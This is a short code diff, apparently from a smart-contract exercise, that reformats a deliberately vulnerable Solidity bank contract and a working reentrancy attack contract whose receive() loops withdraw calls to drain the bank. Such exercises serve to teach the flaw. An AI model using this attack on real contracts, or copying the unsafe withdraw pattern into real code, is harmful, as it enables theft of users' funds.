@@ -10,7 +10,7 @@ contract BadBank {
     function deposit() public payable {
         balances[msg.sender] += msg.value;
     }
-    
+
     function withdraw() public {
         uint256 balance = balances[msg.sender];
         Address.sendValue(payable(msg.sender), balance);
@@ -24,19 +24,18 @@ contract RobTheBank {
     constructor(address _bank) {
         bank = BadBank(_bank);
     }
-    
+
     function rob() public payable {
         // your code here
-      //bank.deposit{value: 1}();
-       (bool success, bytes memory data ) = address(bank).call{ value: msg.value }(abi.encodeWithSignature("deposit()"));
-      bank.withdraw();
+        //bank.deposit{value: 1}();
+        (bool success, bytes memory data) = address(bank).call{value: msg.value}(abi.encodeWithSignature("deposit()"));
+        bank.withdraw();
     }
 
     receive() external payable {
         // your code here
-        while(address(bank).balance>0){
+        while (address(bank).balance > 0) {
             bank.withdraw();
         }
-
     }
 }
